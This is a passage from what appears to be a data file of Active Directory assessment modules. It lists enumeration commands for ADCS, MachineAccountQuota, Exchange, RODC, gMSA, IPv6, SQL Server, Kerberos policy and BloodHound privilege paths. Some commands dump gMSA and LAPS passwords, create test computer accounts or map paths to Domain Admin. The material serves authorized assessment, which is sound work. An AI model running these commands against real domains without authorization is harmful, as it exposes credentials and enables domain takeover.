          { id: 'adcs-esc1-check', title: 'Identify ESC1 templates', command: 'certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -vulnerable | grep -A5 "ESC1"', notes: 'ESC1: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + any enrollment rights.' },
          { id: 'adcs-esc4-check', title: 'Identify ESC4 templates', command: 'certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -vulnerable | grep -A5 "ESC4"', notes: 'ESC4: Write permissions on template object.' },
          { id: 'adcs-esc8-check', title: 'Identify ESC8 HTTP endpoints', command: 'certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -vulnerable | grep -A5 "ESC8"', notes: 'ESC8: HTTP-enabled ADCS enrollment endpoint (relay target).' },
        ],
      },
      {
        id: 'adcs-windows', name: 'Windows ADCS enumeration',
        description: 'PowerShell and certutil ADCS analysis.',
        commands: [
          { id: 'adcs-certutil-ca', title: 'Enumerate enterprise CAs', command: 'certutil -config - -ping && certutil -adca', notes: 'All enterprise CAs in the forest.' },
          { id: 'adcs-templates-all', title: 'List all templates', command: 'certutil -catemplates', notes: 'Template display names and OIDs.' },
          { id: 'adcs-ps-templates', title: 'Enumerate templates via LDAP', command: 'Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com" -Filter * -Properties * | Select-Object Name,displayName,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,pKIExtendedKeyUsage', notes: 'Flag-based template analysis.' },
          { id: 'adcs-san-flag', title: 'Find SAN-enabled templates', command: 'Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com" -Filter * -Properties msPKI-Certificate-Name-Flag | Where-Object { ($_."msPKI-Certificate-Name-Flag" -band 1) -eq 1 } | Select-Object Name,displayName', notes: 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = ESC1 candidate.' },
          { id: 'adcs-enrollment-rights', title: 'Check template enrollment rights', command: "Get-ADObject -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com' -Filter * -Properties nTSecurityDescriptor | ForEach-Object { $name=$_.Name; $_.nTSecurityDescriptor.Access | Where-Object { $_.ActiveDirectoryRights -match 'ExtendedRight' } | Select-Object @{N='Template';E={$name}},IdentityReference,ActiveDirectoryRights }", notes: 'Who can enroll in each template.' },
          { id: 'adcs-ca-acl', title: 'Review CA ACL', command: "Get-Acl 'AD:\\CN=<CAName>,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com' | Format-List", notes: 'CA-level ManageCertificates, ManageCA, and Enroll rights.' },
        ],
      },
      {
        id: 'adcs-ldap', name: 'LDAP ADCS queries',
        description: 'Cross-platform ADCS enumeration.',
        commands: [
          { id: 'adcs-ldap-enrollment-services', title: 'Find enrollment services (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=configuration,dc=corp,dc=com" "(objectClass=pKIEnrollmentService)" cn dNSHostName certificateTemplates msPKI-Cert-Template-OID', notes: 'All CA enrollment services and published templates.' },
          { id: 'adcs-ldap-templates-flags', title: 'Enumerate template flags (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=certificate templates,cn=public key services,cn=services,cn=configuration,dc=corp,dc=com" "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag msPKI-RA-Signature pKIExtendedKeyUsage', notes: 'All template flags for ESC analysis.' },
          { id: 'adcs-ldap-aia', title: 'Read AIA and CRL paths', command: 'ldapsearch -x -H ldap://<IP> -b "cn=aia,cn=public key services,cn=services,cn=configuration,dc=corp,dc=com" "(objectClass=*)" cn cACertificate', notes: 'Authority Information Access and CA cert inventory.' },
        ],
      },
    ],
    excluded_capabilities: ['certificate request abuse', 'ESC exploitation', 'certificate impersonation'],
  },
  {
    id: 'maq_analysis',
    name: 'MachineAccountQuota and Computer Joins',
    category: 'identity-hygiene',
    description: 'ms-DS-MachineAccountQuota value, computers joined by non-admin users, rogue computer accounts, and MAQ-based privilege escalation surface.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'maq-windows', name: 'Windows MAQ queries',
        description: 'PowerShell MAQ and computer creation checks.',
        commands: [
          { id: 'maq-get-value', title: 'Read MachineAccountQuota', command: 'Get-ADDomain | Select-Object -ExpandProperty "ms-DS-MachineAccountQuota"', notes: 'Default is 10 — any non-zero value enables RBCD/noPac attack chains.' },
          { id: 'maq-getdomain-all', title: 'Read full domain MAQ context', command: "Get-ADObject (Get-ADDomain).DistinguishedName -Properties 'ms-DS-MachineAccountQuota' | Select-Object 'ms-DS-MachineAccountQuota'", notes: 'Canonical MAQ read from domain root object.' },
          { id: 'maq-find-userjoined', title: 'Find computers created by non-admins', command: 'Get-ADComputer -Filter * -Properties ms-DS-CreatorSID,Created,DistinguishedName | Where-Object { ($_."ms-DS-CreatorSID") -and ($_."ms-DS-CreatorSID" -notmatch "S-1-5-21.*-512|S-1-5-18") } | Select-Object Name,Created,ms-DS-CreatorSID', notes: 'Non-DA/SYSTEM creator SID signals MAQ abuse or stale rogue accounts.' },
          { id: 'maq-recent-computers', title: 'List recently created computers', command: 'Get-ADComputer -Filter * -Properties Created,ms-DS-CreatorSID | Where-Object {$_.Created -gt (Get-Date).AddDays(-30)} | Select-Object Name,Created,ms-DS-CreatorSID | Sort-Object Created -Descending', notes: 'Recent computer creation for rogue account review.' },
        ],
      },
      {
        id: 'maq-ldap', name: 'LDAP MAQ queries',
        description: 'Cross-platform MAQ enumeration.',
        commands: [
          { id: 'maq-ldap-value', title: 'Read MAQ via LDAP', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(objectClass=domain)" ms-DS-MachineAccountQuota', notes: 'Direct MAQ attribute read.' },
          { id: 'maq-ldap-creator', title: 'Find computers by creator SID', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectClass=computer)(ms-DS-CreatorSID=*))" dNSHostName sAMAccountName ms-DS-CreatorSID whenCreated', notes: 'Creator SID inventory for rogue computer detection.' },
          { id: 'maq-impacket-addcomp', title: 'Verify computer add rights (impacket test)', command: 'impacket-addcomputer <domain>/<user>:<pass> -dc-ip <IP> -method LDAPS -computer-name TESTCHK$ 2>&1 | head -5', notes: 'Tests join capability without persistent creation — clean up test account if created.' },
          { id: 'maq-ldap-recent', title: 'List computers created this month', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectClass=computer)(whenCreated>=20250101000000.0Z))" dNSHostName whenCreated ms-DS-CreatorSID', notes: 'Recent machine accounts for rogue object review.' },
        ],
      },
    ],
    excluded_capabilities: ['computer account creation', 'RBCD exploitation', 'noPac exploitation'],
  },
  {
    id: 'exchange_enum',
    name: 'Exchange Server Discovery',
    category: 'enterprise-management',
    description: 'Exchange server discovery, PrivExchange exposure, Exchange Windows Permissions group, mail flow, mailbox enumeration, OWA endpoints, and EWS attack surface.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'exchange-discovery', name: 'Exchange infrastructure discovery',
        description: 'Exchange server and service enumeration.',
        commands: [
          { id: 'exch-find-servers', title: 'Find Exchange servers via AD', command: 'Get-ADComputer -Filter {ServicePrincipalName -like "*ExchangeMDB*" -or ServicePrincipalName -like "*exchangeMDB*"} -Properties ServicePrincipalName,OperatingSystem | Select-Object Name,ServicePrincipalName', notes: 'Exchange mailbox servers via SPN.' },
          { id: 'exch-get-org', title: 'Get Exchange organization', command: 'Get-ADObject -SearchBase "CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=corp,DC=com" -Filter * | Select-Object Name,DistinguishedName', notes: 'Exchange organization container in AD.' },
          { id: 'exch-exchange-perms-group', title: 'Check Exchange Windows Permissions group', command: 'Get-ADGroupMember "Exchange Windows Permissions" -Recursive | Select-Object Name,SamAccountName,ObjectClass', notes: 'This group has WriteDACL on domain root — PrivExchange chain.' },
          { id: 'exch-trusted-subsystem', title: 'Check Exchange Trusted Subsystem', command: 'Get-ADGroupMember "Exchange Trusted Subsystem" | Select-Object Name,SamAccountName', notes: 'Membership grants broad Exchange-system rights.' },
          { id: 'exch-server-spn', title: 'List all Exchange SPNs', command: 'Get-ADComputer -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -match "Exchange"} | Select-Object Name,ServicePrincipalName', notes: 'Full Exchange SPN inventory.' },
        ],
      },
      {
        id: 'exchange-ldap', name: 'LDAP Exchange discovery',
        description: 'Cross-platform Exchange enumeration.',
        commands: [
          { id: 'exch-ldap-servers', title: 'Find Exchange servers (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=configuration,dc=corp,dc=com" "(objectClass=msExchExchangeServer)" cn networkAddress msExchCurrentServerRoles', notes: 'Exchange server objects in configuration partition.' },
          { id: 'exch-ldap-mailboxes', title: 'Count mailbox-enabled users', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(homeMDB=*)" cn sAMAccountName mail | grep "^cn:" | wc -l', notes: 'Mailbox count for scope estimation.' },
          { id: 'exch-ldap-owa-url', title: 'Find OWA virtual directory', command: 'ldapsearch -x -H ldap://<IP> -b "cn=configuration,dc=corp,dc=com" "(objectClass=msExchOWAVirtualDirectory)" cn msExchInternalAuthenticationMethods msExchExternalAuthenticationMethods', notes: 'OWA URL and authentication method discovery.' },
          { id: 'exch-ldap-perms-group', title: 'Find Exchange Permissions group members (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(cn=Exchange Windows Permissions)" member cn', notes: 'PrivExchange attack surface check.' },
          { id: 'exch-nmap-owa', title: 'Probe Exchange HTTP/HTTPS services', command: 'nmap -sV -p 25,443,587,993,2525 --script ssl-cert,http-title <IP>', notes: 'OWA, SMTP, EWS, and IMAP exposure.' },
        ],
      },
    ],
    excluded_capabilities: ['PrivExchange exploitation', 'mailbox access', 'email extraction'],
  },
  {
    id: 'rodc_full',
    name: 'RODC Inventory and Configuration',
    category: 'topology',
    description: 'Read-Only DC discovery, Password Replication Policy allow/deny lists, RODC krbtgt account, cached credential scope, and RODC privilege path analysis.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'rodc-windows', name: 'Windows RODC enumeration',
        description: 'PowerShell RODC and PRP analysis.',
        commands: [
          { id: 'rodc-list', title: 'List all RODCs', command: 'Get-ADDomainController -Filter {IsReadOnly -eq $true} | Select-Object Name,IPv4Address,Site,ComputerObjectDN,OperatingSystem', notes: 'All Read-Only Domain Controllers.' },
          { id: 'rodc-prp-allowed', title: 'Read PRP allowed list', command: 'Get-ADDomainController -Filter {IsReadOnly -eq $true} | ForEach-Object { Write-Host "RODC: $($_.Name)"; (Get-ADObject $_.ComputerObjectDN -Properties "msDS-RevealOnDemandGroup")."msDS-RevealOnDemandGroup" }', notes: 'Accounts/groups whose passwords can be replicated to this RODC.' },
          { id: 'rodc-prp-denied', title: 'Read PRP deny list', command: 'Get-ADDomainController -Filter {IsReadOnly -eq $true} | ForEach-Object { Write-Host "RODC: $($_.Name)"; (Get-ADObject $_.ComputerObjectDN -Properties "msDS-NeverRevealGroup")."msDS-NeverRevealGroup" }', notes: 'Accounts/groups permanently denied replication.' },
          { id: 'rodc-cached-accounts', title: 'List cached credential accounts', command: 'Get-ADDomainController -Filter {IsReadOnly -eq $true} | ForEach-Object { Write-Host "=== $($_.Name) ==="; Get-ADObject $_.ComputerObjectDN -Properties "msDS-RevealedList" | Select-Object -ExpandProperty "msDS-RevealedList" }', notes: 'Accounts whose passwords are currently cached on the RODC.' },
          { id: 'rodc-krbtgt-account', title: 'Find RODC krbtgt accounts', command: 'Get-ADUser -Filter {SamAccountName -like "krbtgt_*"} -Properties PasswordLastSet,PasswordNeverExpires | Select-Object Name,SamAccountName,PasswordLastSet', notes: 'Each RODC has a unique krbtgt — key age matters for ticket forgery scope.' },
          { id: 'rodc-managed-by', title: 'Review RODC ManagedBy attribute', command: 'Get-ADDomainController -Filter {IsReadOnly -eq $true} | ForEach-Object { (Get-ADObject $_.ComputerObjectDN -Properties ManagedBy) | Select-Object Name,ManagedBy }', notes: 'ManagedBy grants local admin on the RODC — often a non-admin user.' },
        ],
      },
      {
        id: 'rodc-ldap', name: 'LDAP RODC queries',
        description: 'Cross-platform RODC discovery.',
        commands: [
          { id: 'rodc-ldap-list', title: 'Find RODCs (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "ou=domain controllers,dc=corp,dc=com" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))" cn dNSHostName msDS-NeverRevealGroup msDS-RevealOnDemandGroup', notes: 'RODC computer objects with PRP attributes.' },
          { id: 'rodc-ldap-krbtgt', title: 'Find RODC krbtgt accounts (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectClass=user)(sAMAccountName=krbtgt_*))" sAMAccountName pwdLastSet msDS-SecondaryKrbTgtNumber', notes: 'RODC-specific krbtgt accounts.' },
          { id: 'rodc-ldap-prp-deny', title: 'Read PRP deny list (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "ou=domain controllers,dc=corp,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=67108864)" msDS-NeverRevealGroup', notes: 'Groups permanently excluded from RODC replication.' },
          { id: 'rodc-ldap-cached', title: 'Read cached accounts (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "ou=domain controllers,dc=corp,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=67108864)" msDS-RevealedList', notes: 'Currently cached credential principals on RODC.' },
        ],
      },
    ],
    excluded_capabilities: ['RODC krbtgt extraction', 'key list attack', 'ticket forgery'],
  },
  {
    id: 'gmsa_full',
    name: 'gMSA Detailed Analysis',
    category: 'identity',
    description: 'Group Managed Service Account inventory, retrieval permissions, PrincipalsAllowedToRetrieveManagedPassword, SPN coverage, and msDS-GroupMSAMembership ACL review.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'gmsa-windows', name: 'Windows gMSA queries',
        description: 'PowerShell gMSA inventory and ACL review.',
        commands: [
          { id: 'gmsa-list-all', title: 'List all gMSAs', command: 'Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties * | Select-Object Name,SamAccountName,SID,ServicePrincipalName,msDS-GroupMSAMembership,PrincipalsAllowedToRetrieveManagedPassword,PasswordLastSet,DistinguishedName', notes: 'Full gMSA inventory with retrieval scope.' },
          { id: 'gmsa-retrievers', title: 'List password retrieval scope', command: 'Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword | Select-Object Name,PrincipalsAllowedToRetrieveManagedPassword', notes: 'Which principals can retrieve each gMSA password.' },
          { id: 'gmsa-test-retrieve', title: 'Test gMSA retrieval (current context)', command: 'Test-ADServiceAccount -Identity <gMSAName>', notes: 'Tests if the current host/user can retrieve the gMSA password without doing so.' },
          { id: 'gmsa-spn', title: 'List gMSA SPNs', command: "Get-ADServiceAccount -Filter * -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName | Where-Object { $_.ServicePrincipalName }", notes: 'gMSA SPN inventory — Kerberoast-resistant by design but useful for service mapping.' },
          { id: 'gmsa-goldenGMSA-prereq', title: 'Check KDS root key (GoldenGMSA prereq)', command: 'Get-KdsRootKey', notes: 'KDS root key age and ID — GoldenGMSA requires domain admin to read this.' },
        ],
      },
      {
        id: 'gmsa-ldap', name: 'LDAP gMSA queries',
        description: 'Cross-platform gMSA discovery.',
        commands: [
          { id: 'gmsa-ldap-inventory', title: 'gMSA inventory (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(objectClass=msDS-GroupManagedServiceAccount)" cn sAMAccountName servicePrincipalName msDS-GroupMSAMembership msDS-ManagedPasswordInterval', notes: 'All gMSA objects with membership and interval.' },
          { id: 'gmsa-ldap-kds', title: 'Find KDS root key (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=master root keys,cn=group key distribution service,cn=services,cn=configuration,dc=corp,dc=com" "(objectClass=*)" cn msKds-CreateTime msKds-UseStartTime', notes: 'KDS root key object — requires privileged bind.' },
          { id: 'gmsa-gmsadumper', title: 'Dump gMSA password (gMSADumper)', command: 'python3 gMSADumper.py -u <user> -p <pass> -d <domain> -l <DC_IP>', notes: 'Authorized-context gMSA password read.' },
        ],
      },
    ],
    excluded_capabilities: ['gMSA password extraction', 'GoldenGMSA', 'service account impersonation'],
  },
  {
    id: 'ipv6_enum',
    name: 'IPv6 and mDNS Exposure',
    category: 'infrastructure',
    description: 'IPv6 host discovery, DHCPv6 configuration, mitm6 prerequisites, mDNS exposure, WPAD over IPv6, and dual-stack attack surface mapping.',
    supported_modes: ['LINUX_REMOTE', 'WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'ipv6-discovery', name: 'IPv6 host and service discovery',
        description: 'Active IPv6 enumeration from Linux.',
        commands: [
          { id: 'ipv6-ping-all-nodes', title: 'Ping all-nodes multicast', command: 'ping6 -c3 ff02::1%<interface>', notes: 'Discovers all IPv6 nodes on the local segment.' },
          { id: 'ipv6-nmap-scan', title: 'nmap IPv6 scan', command: 'nmap -6 -sV -p 88,389,445,636,3268,5985 <IPv6>', notes: 'AD service discovery over IPv6.' },
          { id: 'ipv6-nmap-multicast', title: 'Discover IPv6 hosts via nmap', command: 'nmap -6 --script ipv6-multicast-mld-list fe80::/10', notes: 'MLD multicast list for link-local host discovery.' },
          { id: 'ipv6-check-dhcpv6', title: 'Check for DHCPv6 server', command: 'nmap -sU -p 547 --script dhcp6-info <subnet>', notes: 'Active DHCPv6 = mitm6 prerequisite.' },
          { id: 'ipv6-reg-prefer', title: 'Check IPv6 preference (Windows)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip6\\Parameters /v DisabledComponents', notes: '0 or absent = IPv6 enabled and preferred over IPv4 for .local names.' },
        ],
      },
      {
        id: 'mdns-wpad', name: 'mDNS and WPAD exposure',
        description: 'Multicast DNS and WPAD poisoning prerequisites.',
        commands: [
          { id: 'mdns-check-port', title: 'Check mDNS port (5353)', command: 'nmap -sU -p 5353 --script dns-service-discovery <subnet>', notes: 'mDNS active = Responder mDNS poisoning vector.' },
          { id: 'wpad-dns-check', title: 'Check WPAD DNS record', command: 'nslookup wpad <DC_IP>', notes: 'WPAD DNS entry prevents autodiscovery from falling to LLMNR/mDNS.' },
          { id: 'wpad-reg-check', title: 'WPAD proxy autodiscovery (Windows)', command: 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v AutoDetect', notes: '1 = WPAD autodiscovery enabled on the queried host.' },
          { id: 'ipv6-interface-info', title: 'List IPv6 interfaces (Windows)', command: 'Get-NetIPAddress -AddressFamily IPv6 | Where-Object {$_.PrefixOrigin -ne "WellKnown"} | Select-Object InterfaceAlias,IPAddress,PrefixLength,PrefixOrigin', notes: 'Dual-stack interface inventory.' },
        ],
      },
    ],
    excluded_capabilities: ['DHCPv6 poisoning', 'mDNS/WPAD poisoning', 'IPv6 MITM'],
  },
  {
    id: 'sql_ad_enum',
    name: 'SQL Server AD Discovery',
    category: 'enterprise-management',
    description: 'SQL Server discovery via AD SPNs, linked server enumeration, sysadmin privilege mapping, SQL service accounts, and AD-integrated SQL attack surface.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'sql-discovery', name: 'SQL Server discovery via AD',
        description: 'Find SQL instances through SPNs and DNS.',
        commands: [
          { id: 'sql-find-spn', title: 'Find SQL SPNs in AD', command: 'Get-ADComputer -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -match "MSSQLSvc"} | Select-Object Name,ServicePrincipalName', notes: 'All SQL server instances registered in AD.' },
          { id: 'sql-find-spn-users', title: 'Find SQL SPNs on user accounts', command: "Get-ADUser -LDAPFilter '(servicePrincipalName=MSSQLSvc/*)' -Properties ServicePrincipalName | Select-Object SamAccountName,ServicePrincipalName", notes: 'SQL service accounts using user objects — Kerberoast candidates.' },
          { id: 'sql-ldap-spn', title: 'Find SQL SPNs via LDAP', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(servicePrincipalName=MSSQLSvc/*)" sAMAccountName servicePrincipalName cn', notes: 'Cross-platform SQL discovery.' },
          { id: 'sql-nmap-scan', title: 'Scan SQL ports', command: 'nmap -sV -p 1433,1434 --script ms-sql-info,ms-sql-empty-password,ms-sql-config <IP>', notes: 'SQL version, instance, and empty-password check.' },
          { id: 'sql-find-linked', title: 'Find linked servers (SQL query)', command: "SELECT name, data_source FROM sys.servers WHERE is_linked = 1", notes: 'Run on SQL host — linked servers can chain to other SQL boxes.' },
          { id: 'sql-sysadmins', title: 'Find SQL sysadmins', command: "SELECT name, type_desc FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1", notes: 'Run on SQL host — sysadmin role holders.' },
          { id: 'sql-impacket', title: 'Test SQL auth (impacket)', command: 'impacket-mssqlclient <domain>/<user>:<pass>@<IP> -windows-auth', notes: 'Authorized credential test for SQL access assessment.' },
        ],
      },
      {
        id: 'sql-posture', name: 'SQL posture checks',
        description: 'SQL configuration and privilege assessment.',
        commands: [
          { id: 'sql-xp-cmdshell', title: 'Check xp_cmdshell state', command: "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'", notes: '1 = enabled — OS command execution from SQL.' },
          { id: 'sql-linked-exec', title: 'Check linked server execution', command: 'EXEC sp_linkedservers', notes: 'Lists linked servers; combined with OPENQUERY for lateral movement.' },
          { id: 'sql-cme-scan', title: 'CME MSSQL scan', command: 'crackmapexec mssql <IP/CIDR> -u <user> -p <pass> -d <domain>', notes: 'Mass SQL auth test for scope assessment.' },
        ],
      },
    ],
    excluded_capabilities: ['SQL RCE', 'xp_cmdshell execution', 'linked server exploitation'],
  },
  {
    id: 'kerberos_policy_enum',
    name: 'Kerberos Policy and Configuration',
    category: 'identity',
    description: 'Domain Kerberos policy (ticket lifetime, renewal, delegation), AES vs RC4 enforcement, krbtgt status, and Kerberos security hardening gaps.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'krb-policy-windows', name: 'Windows Kerberos policy',
        description: 'PowerShell and registry Kerberos configuration checks.',
        commands: [
          { id: 'krb-domain-policy', title: 'Read domain Kerberos policy', command: 'Get-ADDefaultDomainPasswordPolicy | Select-Object MaxTicketAge,MaxRenewAge,MaxServiceTicketAge,MaxClockSkew', notes: 'TGT lifetime (MaxTicketAge), renewal window, and skew tolerance.' },
          { id: 'krb-krbtgt-age', title: 'Check krbtgt password age', command: 'Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet', notes: 'Old krbtgt = Golden Ticket material remains valid longer.' },
          { id: 'krb-aes-only', title: 'Find accounts without AES keys', command: 'Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes | Where-Object { ($_."msDS-SupportedEncryptionTypes" -band 24) -eq 0 } | Select-Object SamAccountName,msDS-SupportedEncryptionTypes | Where-Object {$_.SamAccountName -notmatch "krbtgt"}', notes: 'RC4-only accounts — weaker cipher, easier offline cracking.' },
          { id: 'krb-rc4-disabled', title: 'Check RC4 disabled policy', command: 'Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters" -Name SupportedEncryptionTypes -ErrorAction SilentlyContinue', notes: '24=AES only, 31=all. Missing = RC4 enabled.' },
          { id: 'krb-protected-users', title: 'Protected Users Kerberos benefits', command: 'Get-ADGroupMember "Protected Users" | ForEach-Object { Get-ADUser $_ -Properties msDS-SupportedEncryptionTypes,DoesNotRequirePreAuth,TrustedForDelegation | Select-Object SamAccountName,msDS-SupportedEncryptionTypes,DoesNotRequirePreAuth }', notes: 'Verifies Protected Users are getting AES enforcement.' },
          { id: 'krb-tickets-current', title: 'Review current Kerberos tickets', command: 'klist tickets', notes: 'Current TGT and TGS session state.' },
        ],
      },
      {
        id: 'krb-policy-ldap', name: 'LDAP Kerberos checks',
        description: 'Cross-platform Kerberos configuration discovery.',
        commands: [
          { id: 'krb-ldap-policy', title: 'Read Kerberos policy object (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=kerberos,cn=<domain_policy_GUID>,cn=system,dc=corp,dc=com" "(objectClass=domainRelatedObject)" maxTicketAge maxRenewAge maxServiceAge', notes: 'Kerberos policy object in system container.' },
          { id: 'krb-ldap-krbtgt', title: 'Read krbtgt metadata (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(sAMAccountName=krbtgt)" pwdLastSet msDS-SupportedEncryptionTypes userAccountControl', notes: 'krbtgt password age and encryption type.' },
          { id: 'krb-ldap-aes-only', title: 'Find RC4-only accounts (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user)(msDS-SupportedEncryptionTypes=0))" sAMAccountName msDS-SupportedEncryptionTypes', notes: '0 = default encryption, typically RC4.' },
          { id: 'krb-nmap-version', title: 'Probe Kerberos service version', command: 'nmap -p 88 -sV --script krb5-enum-users --script-args "krb5-enum-users.realm=<DOMAIN>" <IP>', notes: 'Validates Kerberos service response and realm.' },
        ],
      },
    ],
    excluded_capabilities: ['Kerberos ticket theft', 'Golden/Silver ticket operations', 'krbtgt hash extraction'],
  },
  {
    id: 'priv_path_analysis',
    name: 'Privilege Escalation Path Analysis',
    category: 'privilege-escalation',
    description: 'BloodHound-based path discovery, shortest paths to Domain Admin, high-value targets, AS-REP and Kerberoast chain analysis, and cross-tier privilege paths.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'privpath-bloodhound', name: 'BloodHound path analysis',
        description: 'Graph-based privilege path discovery and analysis.',
        commands: [
          { id: 'privpath-bh-collect', title: 'Collect for path analysis', command: 'bloodhound-python -d <domain> -u <user> -p <pass> -dc <DC> -c All --zip', notes: 'Full collection for accurate graph edges.' },
          { id: 'privpath-bh-dacl', title: 'Collect DACL edges', command: 'bloodhound-python -d <domain> -u <user> -p <pass> -dc <DC> -c DCOM,ACL,LocalAdmin', notes: 'Targeted DACL and local admin edge collection.' },
          { id: 'privpath-bh-cypher-da', title: 'Find shortest paths to DA (Cypher)', command: "MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p", notes: 'Run in BloodHound Cypher console — shortest DA paths.' },
          { id: 'privpath-bh-cypher-dc', title: 'Find paths to DC (Cypher)', command: "MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name:'DC01.CORP.LOCAL'})) RETURN p", notes: 'Direct paths to domain controller object.' },
          { id: 'privpath-bh-owned', title: 'Mark owned principals (Cypher)', command: "MATCH (u:User {name:'<owned>@CORP.LOCAL'}) SET u.owned=true RETURN u", notes: 'Marks starting point for reachability analysis.' },
          { id: 'privpath-bh-sessions', title: 'Find DA session hosts', command: "MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.name CONTAINS 'ADMIN' RETURN u.name,c.name", notes: 'Hosts with privileged user sessions — lateral movement targets.' },
        ],
      },
      {
        id: 'privpath-manual', name: 'Manual privilege path checks',
        description: 'Direct privilege path queries without BloodHound.',
        commands: [
          { id: 'privpath-find-owned-to-da', title: 'Map owned-to-DA control paths', command: "impacket-GetADUsers <domain>/<user>:<pass> -all -dc-ip <IP> | grep -i 'admin\|priv'", notes: 'Quick admin account discovery for owned-host review.' },
          { id: 'privpath-laps-readable', title: 'Find LAPS-readable computers', command: "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,msLAPS-Password | Where-Object { $_.'ms-Mcs-AdmPwd' -or $_.'msLAPS-Password' } | Select-Object Name,ms-Mcs-AdmPwd,msLAPS-Password", notes: 'Hosts where LAPS password is readable in current context.' },
          { id: 'privpath-gmsa-readable', title: 'Test gMSA readability', command: 'Get-ADServiceAccount -Filter * | ForEach-Object { try { $pw = ($_ | Get-ADServiceAccount -Properties msDS-ManagedPassword)."msDS-ManagedPassword"; if ($pw) { Write-Host "$($_.Name) is readable" } } catch {} }', notes: 'Which gMSA passwords are readable in current context.' },
          { id: 'privpath-nested-groups', title: 'Trace nested group membership', command: 'Get-ADGroupMember -Identity "Domain Admins" -Recursive | Where-Object {$_.objectClass -eq "user"} | Select-Object Name,SamAccountName,DistinguishedName', notes: 'Recursive DA membership — nested group pivot paths.' },
        ],
      },
    ],
    excluded_capabilities: ['privilege escalation exploitation', 'lateral movement execution'],
  },
  {
    id: 'sid_history_enum',
    name: 'SID History Enumeration',
    category: 'identity-hygiene',
    description: 'SID history attribute discovery, cross-domain SID values, ExtraSids risk, and SID filtering configuration review.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'sidh-windows', name: 'Windows SID history queries',
